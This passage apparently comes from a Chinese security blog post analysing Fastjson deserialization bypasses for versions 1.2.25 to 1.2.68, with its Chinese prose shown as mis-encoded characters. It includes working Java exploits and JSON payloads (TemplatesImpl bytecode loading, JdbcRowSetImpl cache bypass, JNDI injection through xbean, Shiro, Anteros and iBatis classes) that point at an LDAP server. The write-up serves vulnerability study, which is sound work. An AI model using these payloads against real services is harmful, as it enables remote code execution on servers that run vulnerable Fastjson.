class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//å¼€å¯AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>; <span class="hljs-comment">//ç”¨[&#123;æ¥ç»•è¿‡</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;[&#123;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311541263.png" alt="image-20240831154143113"></p><p>åˆ†æä¸€ä¸‹è¿™ä¸ªpayloadçš„åŸç†ï¼Œé¦–å…ˆå‰é¢æˆ‘ä»¬çŸ¥é“åªåŠ ä¸€ä¸ª[æ˜¯å¯ä»¥è¿›å…¥loadClassé‡Œé¢çš„ï¼Œä½†æ˜¯æ­¤æ—¶ä¼šjsonè§£æé”™è¯¯</p><p><img src="https://cdn.clown2024.cn/202408311550012.png" alt="image-20240831155047869"></p><p>è¿™é‡Œè¯´æœŸå¾…ä¸€ä¸ª[ä½†æ˜¯åœ¨ç¬¬ä¸ƒåä¸€ä½ç½®æ˜¯â€™,â€™ï¼Œå°±æ˜¯TemplatesImplåé¢é‚£ä¸ªé€—å·çš„ä½ç½®</p><p>é‚£æˆ‘ä»¬å°±è¡¥ä¸Šä¸€ä¸ª[</p><p><img src="https://cdn.clown2024.cn/202408311554785.png" alt="image-20240831155444662"></p><p>ç„¶ååˆè¯´ç¼ºå°‘ä¸€ä¸ª{ï¼Œé‚£å†è¡¥ä¸Šå»å³å¯</p><blockquote><p>ä¸è¿‡æ€ªæ€ªçš„è¿™å°±èƒ½è§£ææˆåŠŸäº†ï¼ŸğŸ˜¢</p></blockquote><h1 id="fastjson1225-1247é€šæ€"><a href="#FastJson1-2-25-1-2-47é€šæ€" class="headerlink" title="FastJson1.2.25-1.2.47é€šæ€"></a>FastJson1.2.25-1.2.47é€šæ€</h1><p><strong>å½±å“ç‰ˆæœ¬</strong></p><p>1.2.25-1.2.32:</p><p>æœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯äº†åè€Œä¸è¡Œ</p><p>1.2.33-1.2.47:</p><p>æ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupportéƒ½èƒ½æˆåŠŸåˆ©ç”¨</p><p><strong>å…¶ä»–çš„é™åˆ¶</strong></p><p>åŸºäºRMIåˆ©ç”¨çš„JDKç‰ˆæœ¬&lt;&#x3D;6u141ã€7u131ã€8u121ï¼ŒåŸºäºLDAPåˆ©ç”¨çš„JDKç‰ˆæœ¬&lt;&#x3D;6u211ã€7u201ã€8u191</p><h2 id="1225ltx3dfastjsonltx3d1232"><a href="#1-2-25" class="headerlink" title="1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32"></a>1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32</h2><p>å…ˆç»™å‡ºexpï¼Œè¿™é‡Œç”¨çš„JdbcRowSetImplçš„é“¾å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311634449.png" alt="image-20240831163451309"></p><p>æ•´ä½“æ€è·¯ï¼šé€šè¿‡java.lang.Classï¼Œå°†JdbcRowSetImplç±»åŠ è½½åˆ°Mapä¸­ç¼“å­˜ï¼Œä»è€Œç»•è¿‡AutoTypeçš„æ£€æµ‹ã€‚å› æ­¤å°†payloadåˆ†ä¸¤æ¬¡å‘é€ï¼Œç¬¬ä¸€æ¬¡åŠ è½½ï¼Œç¬¬äºŒæ¬¡æ‰§è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåªè¦é‡åˆ°æ²¡æœ‰åŠ è½½åˆ°ç¼“å­˜çš„ç±»ï¼ŒcheckAutoType()å°±ä¼šæŠ›å‡ºå¼‚å¸¸ç»ˆæ­¢ç¨‹åºã€‚</p><p>å»çœ‹ä¸€ä¸‹ä»–çš„checkAutoTypeå‡½æ•°æ¥åˆ†æä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408311638035.png" alt="image-20240831163822049"></p><p>æˆ‘ä»¬å…ˆä»ç¼“å­˜ä¸­å»è·å–è¿™ä¸ªç±»ï¼Œç„¶åä¸ºnullç›´æ¥åˆ°findClassè¿™é‡Œï¼Œè¿™é‡Œçš„ç¼“å­˜mappingåœ¨ä¸€å¼€å§‹çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œé™æ€ä»£ç å—æ”¾ä¸€äº›ç±»è¿›å»</p><p><img src="https://cdn.clown2024.cn/202408311643708.png" alt="image-20240831164311603"></p><p>ç„¶åéå†bucketsï¼Œæ ¹æ®é”®å€¼æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨è¯¥ç±»ï¼Œè¿™é‡Œæ˜¯å¯ä»¥ç›´æ¥æ‰¾åˆ°çš„ï¼Œç„¶ååˆ¤æ–­clazzä¸ä¸ºç©ºåç›´æ¥è¿”å›</p><p>ç„¶åä¸€è·¯å¾€ä¸‹èµ°åˆ°deserializeçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202408311646395.png" alt="image-20240831164635293"></p><p>è¿™é‡Œè°ƒç”¨çš„æ˜¯**MiscCodec.deserialze()**ï¼Œèµ°è¿›å»è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202408311649743.png" alt="image-20240831164903622"></p><p>å¾€ä¸‹åˆ°è¿™é‡Œï¼Œåˆ¤æ–­é”®å€¼æ˜¯å¦ä¸ºvalï¼Œæ˜¯çš„è¯å†æå–valé”®å¯¹åº”çš„å€¼èµ‹ç»™objValå˜é‡ï¼Œè€ŒobjValåœ¨åé¢ä¼šèµ‹å€¼ç»™strValå˜é‡</p><p><img src="https://cdn.clown2024.cn/202408311650152.png" alt="image-20240831165057048"></p><p>è¿™é‡Œèµ‹å€¼äº†ç»™strVal</p><p>ç„¶åç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408311658049.png" alt="image-20240831165810941"></p><p>åˆ¤æ–­clazzæ˜¯å¦ä¸ºClass.classï¼Œç„¶ååˆ°è¿™é‡ŒloadClass</p><p><img src="https://cdn.clown2024.cn/202408311659949.png" alt="image-20240831165951852"></p><p>loadå®Œä¹‹åå°±ä¼šæ”¾å…¥ç¼“å­˜ä¸­</p><p>ç„¶ååœ¨æ‰«æç¬¬äºŒéƒ¨åˆ†JSONæ•°æ®çš„æ—¶å€™ï¼Œç”±äºæˆ‘ä»¬çš„ç±»å·²ç»è¢«æ”¾åœ¨ç¼“å­˜ä¸­äº†ï¼Œæˆ‘ä»¬åœ¨å‰é¢çš„**TypeUtils.getClassFromMapping(typeName)**å°±èƒ½è·å–åˆ°clazzï¼Œç„¶åç›´æ¥è¿”å›</p><p><img src="https://cdn.clown2024.cn/202408311703708.png" alt="image-20240831170308601"></p><p>å¯ä»¥çœ‹åˆ°ç›´æ¥è¿”å›ä»è€Œç»•è¿‡äº†checkAutoType</p><p>ç„¶åå¦‚æœå¼€å¯äº†autoTypeSupportçš„è¯å°±ä¼šæ— æ³•ç»•è¿‡å‰é¢çš„é»‘åå•ï¼Œæ‰€ä»¥å¼€å¯äº†åè€Œä¸è¡Œ</p><p><img src="https://cdn.clown2024.cn/202408311704028.png" alt="image-20240831170428910"></p><h2 id="1233ltx3dfastjsonltx3d1247"><a href="#1-2-33" class="headerlink" title="1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47"></a>1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47</h2><p>è¿™éƒ¨åˆ†çš„ç‰ˆæœ¬å¼€äº†autoTypeSupportæ˜¯å¯ä»¥æˆåŠŸ</p><p><strong>æœªå¼€å¯autoTypeæ—¶</strong></p><p>è¿™é‡Œå°±å’Œå‰é¢ä¸€æ ·å°±ä¸ç”¨åˆ†æäº†</p><p><strong>å¼€å¯autoTypeæ—¶</strong></p><p>è¿™é‡ŒcheckAutoTypeæ”¹äº†ä¸€ç‚¹åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202408311724426.png" alt="image-20240831172445310"></p><p>è¿™é‡Œå¤šäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œéœ€è¦**TypeUtils.getClassFromMapping(typeName)**è¿”å›ä¸ºnullæ‰è¡Œï¼Œæˆ‘ä»¬è¿™é‡Œè¿”å›ä¸ä¸ºnullè‡ªç„¶ä¹Ÿä¸ä¼šæŠ›å‡ºå¼‚å¸¸</p><h1 id="fastjson1248-1268"><a href="#Fastjson1-2-48-1-2-68" class="headerlink" title="Fastjson1.2.48-1.2.68"></a>Fastjson1.2.48-1.2.68</h1><p>è¿™éƒ¨åˆ†ç‰ˆæœ¬å¾ˆå¤šéƒ½æ˜¯ç”¨é»‘åå•ç»•è¿‡çš„åˆ©ç”¨æ–¹å¼ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/232774">https://www.anquanke.com/post/id/232774</a></p><h2 id="fastjsonltx3d1262"><a href="#Fastjson" class="headerlink" title="Fastjson&lt;&#x3D;1.2.62"></a>Fastjson&lt;&#x3D;1.2.62</h2><p>ä¸€æ ·å…ˆç»™ä¸ªpayload</p><p>org.apache.xbean.propertyeditor.JndiConverterç±»çš„toObjectImpl()å‡½æ•°å­˜åœ¨JNDIæ³¨å…¥æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;ldap://127.0.0.1:9999/zoZdyoJH&quot;&#125;;<br></code></pre></td></tr></table></figure><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-comment">//fastjson1.2.62</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Advanced_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;&#125;&quot;</span>;<br>        JSON.parse(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥åˆ©ç”¨æ–¹å¼è¿˜éœ€è¦æˆ‘ä»¬æ»¡è¶³ä¸€äº›å‰ç½®æ¡ä»¶ï¼š</p><ul><li><p>éœ€è¦å¼€å¯AutoTypeï¼›</p></li><li><p>Fastjson &lt;&#x3D; 1.2.62ï¼›</p></li><li><p>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</p></li><li><p>ç›®æ ‡æœåŠ¡ç«¯éœ€è¦å­˜åœ¨xbean-reflectåŒ…ï¼›</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.clown2024.cn/202408312240189.png" alt="image-20240831224018027"></p><p><strong>è°ƒè¯•åˆ†æ</strong></p><p>å…ˆæ ¹æ®payloadçœ‹ä¸€ä¸‹åˆ©ç”¨çš„ç‚¹</p><p>çœ‹ä¸€ä¸‹å…³é”®ç±»<strong>JndiConverter</strong>çš„jndiåˆ©ç”¨ç‚¹</p><p><img src="https://cdn.clown2024.cn/202409010012684.png" alt="image-20240901001248560"></p><p>é‚£å°±æ˜¯éœ€è¦æˆ‘ä»¬çš„setæ–¹æ³•èƒ½å¤Ÿè§¦å‘åˆ°è¯¥ç±»ï¼Œç„¶åçœ‹payloadå¯ä»¥çŸ¥é“æ˜¯è§¦å‘äº†ä¸€ä¸ª<strong>setAsText</strong>æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªç±»æ²¡æœ‰ï¼Œé‚£å°±åº”è¯¥æ˜¯åœ¨çˆ¶ç±»é‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥å¾€ä¸ŠæŸ¥æ‰¾è°ƒç”¨ç±»ï¼Œæœ€ç»ˆæ˜¯æ‰¾åˆ°äº†ä¸€ä¸ª<strong>AbstractConverter</strong>çš„ç±»</p><p><img src="https://cdn.clown2024.cn/202409010015651.png" alt="image-20240901001557551"></p><p><img src="https://cdn.clown2024.cn/202409010016240.png" alt="image-20240901001634139"></p><p>ä»–è¿™é‡Œè°ƒç”¨äº†toObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409010017706.png" alt="image-20240901001722611"></p><p>ç„¶åè°ƒç”¨äº†toObjectImplæ–¹æ³•ï¼Œæœ€ç»ˆåˆ°æˆ‘ä»¬æ‰§è¡Œjndiçš„åœ°æ–¹</p><p>åˆ©ç”¨é“¾çš„æµç¨‹çŸ¥é“äº†ï¼Œç°åœ¨æ¥çœ‹ä¸€ä¸‹checkAutoTypeå‡½æ•°çš„æµç¨‹ï¼Œä¸»è¦æ˜¯çœ‹çœ‹ä»–æ–°å¢çš„é€»è¾‘ï¼Œè¿™é‡Œåˆ†æçš„æ˜¯å¼€å¯autoTypeSupportçš„æ—¶å€™</p><p><img src="https://cdn.clown2024.cn/202409010028755.png" alt="image-20240901002806625"></p><p>è¿™é‡Œä¼šå…ˆè¿›åˆ°ç¬¬ä¸€éƒ¨åˆ†çš„é»‘ç™½åå•åˆ¤æ–­ï¼Œç”±äºè¯¥ç±»ä¸åœ¨é»‘ç™½åå•å†…å°±ç›´æ¥å¾€ä¸‹èµ°</p><p><img src="https://cdn.clown2024.cn/202409010032724.png" alt="image-20240901003236610"></p><p>ä¸€è·¯èµ°åˆ°è¿™ä¸ªç±»ï¼Œæ­¤æ—¶clazzä¸ºnullä¸”å¼€å¯äº†autoTypeSupportï¼Œå°±ç›´æ¥loadClassï¼Œåé¢å°±æ˜¯æ­£å¸¸çš„ååºåˆ—åŒ–æµç¨‹äº†</p><p><strong>æœªå¼€å¯autoTypeSupport</strong></p><p><img src="https://cdn.clown2024.cn/202409010037003.png" alt="image-20240901003743874"></p><p>ä»–ä¼šè¿›åˆ°è¿™é‡Œçš„åˆ¤æ–­é€»è¾‘ï¼Œä¹Ÿæ˜¯æ­£å¸¸çš„é»‘ç™½åå•æ ¡éªŒç›´æ¥è¿‡å»ï¼Œä¸»è¦çš„æ˜¯ä»–ä¼šèµ°åˆ°ä¸‹é¢è¿™ä¸ªåœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202409010039269.png" alt="image-20240901003925151"></p><p>è¿™é‡Œä¼šç›´æ¥æŠ›å¼‚å¸¸æ‰€ä»¥ä¹Ÿå°±ä¸ä¼šloadClassäº†</p><h2 id="fastjson1266"><a href="#Fastjson1-2-66" class="headerlink" title="Fastjson1.2.66"></a>Fastjson1.2.66</h2><p>è¯¥ç‰ˆæœ¬ä¹Ÿæ˜¯é»‘åå•ç»•è¿‡ï¼Œ1.2.66æ¶‰åŠå¤šæ¡Gadgeté“¾ï¼ŒåŸç†éƒ½æ˜¯å­˜åœ¨JDNIæ³¨å…¥æ¼æ´ã€‚</p><p>ç»™å‡ºå„é“¾å­çš„payload</p><p>org.apache.shiro.realm.jndi.JndiRealmFactoryç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;Realms&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>br.com.anteros.dbcp.AnterosDBCPConfigç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br>æˆ–<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfigç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Properties&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;UserTransaction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ»¡è¶³æ¡ä»¶ï¼š</p><ul><li>å¼€å¯AutoTypeï¼›</li><li>Fastjson &lt;&#x3D; 1.2.66ï¼›</li><li>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</li><li>org.apache.shiro.jndi.JndiObjectFactoryç±»éœ€è¦shiro-coreåŒ…ï¼›</li><li>br.com.anteros.dbcp.AnterosDBCPConfigç±»éœ€è¦Anteros-Coreå’ŒAnteros-DBCPåŒ…ï¼›</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfigç±»éœ€è¦ibatis-sqlmapå’ŒjtaåŒ…ï¼›</li></ul><p>emmmæˆ‘è°ƒè¯•äº†ä¸€ä¸‹1.2.62çš„payloadï¼Œå‘ç°ä»–çš„åˆ¤æ–­é€»è¾‘æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œåªæ˜¯æŠŠé»‘åå•å¢åŠ äº†åº”è¯¥æ˜¯ï¼Œæ‰€ä»¥ç›´æ¥åœ¨é»‘åå•å¤„è¢«æ£€æµ‹åˆ°ç„¶åæŠ›å‡ºå¼‚å¸¸</p><p><img src="https://cdn.clown2024.cn/202409010044210.png" alt="image-20240901004414066"></p><p>æ‰€ä»¥autoTypeçš„éƒ¨åˆ†å°±ä¸åˆ†æäº†ï¼Œå°±çœ‹å„payloadçš„åˆ©ç”¨é“¾å°±å¥½</p><p><strong>org.apache.shiro.realm.jndi.JndiRealmFactory</strong></p><p>å…ˆå¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shiro_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409010104683.png" alt="image-20240901010441536"></p><p>æˆ‘ä»¬ç›´æ¥å»çœ‹ä¸€ä¸‹<strong>JndiRealmFactory</strong>è¿™ä¸ªç±»ï¼Œå‘ç°ä»–çš„getRealmsæ–¹æ³•å­˜åœ¨JNDIæ³¨å…¥</p><p><img src="https://cdn.clown2024.cn/202409010113706.png" alt="image-20240901011300563"></p><p>ç„¶åæ˜¯éå†jndiNamesæ¥ä¼ å…¥å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œpayloadè®¾ç½®ä¸€ä¸ªjndiNamesæ•°ç»„</p><p>getæ–¹æ³•è°ƒç”¨ï¼š</p><p>è‡³äºè¿™é‡Œä¸ºä»€ä¹ˆè°ƒç”¨getè€Œä¸æ˜¯setï¼Œä¹Ÿè¡¥å……ä¸€ä¸‹å‰é¢æ²¡æœ‰æåˆ°è¿™ä¸ª</p><p>è¿˜è®°å¾—å‰é¢æœ‰å¯¹å„ç§æ–¹æ³•å’Œå­—æ®µéå†çš„JavaBeanInfoçš„å°è£…å§</p><p><img src="https://cdn.clown2024.cn/202409010144471.png" alt="image-20240901014448343"></p><p>è¿™ä¸ªç‰ˆæœ¬è™½ç„¶æ”¹äº†ä¸€ç‚¹ï¼Œä½†ä¸å½±å“ç›®å‰çš„åˆ†æï¼Œè¿™ä¸ªç®­å¤´æ‰€æŒ‡çš„å°±æ˜¯åœ¨éå†ç±»çš„getæ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æ‰§è¡Œäº†ä»€ä¹ˆæ“ä½œ</p><p><img src="https://cdn.clown2024.cn/202409010150192.png" alt="image-20240901015008065"></p><p>è¿™é‡Œå¯¹è¿”å›å€¼çš„ç±»å‹è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœä¸ºç¬¦åˆçš„ç±»å‹è¿›åˆ°é€»è¾‘é‡Œé¢ï¼Œæˆ‘ä»¬è¿™é‡Œä¼ çš„æ˜¯[]ä¸”getæ–¹æ³•è¿”å›å€¼ä¸ºCollectionç¬¦åˆè¿”å›å€¼ä¸ºCollectionçš„æƒ…å†µæ‰€ä»¥ä¼šç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409010210700.png" alt="image-20240901021056578"></p><p>ç„¶åå¦‚æœç±»é‡Œé¢æ²¡æœ‰setæ–¹æ³•å°±ä¼šèµ°åˆ°è¿™é‡Œéå†getæ–¹æ³•çš„è¿™ä¸€æ­¥ï¼Œä¸ç„¶å°±ä¼šè¿›å…¥åˆ°ä¸Šä¸€æ­¥çš„continueï¼Œå› ä¸ºå‰é¢çš„ä¸€ä¸ªéå†methodæ˜¯ä¼˜å…ˆsetæ–¹æ³•ï¼Œæœ€ååŒæ 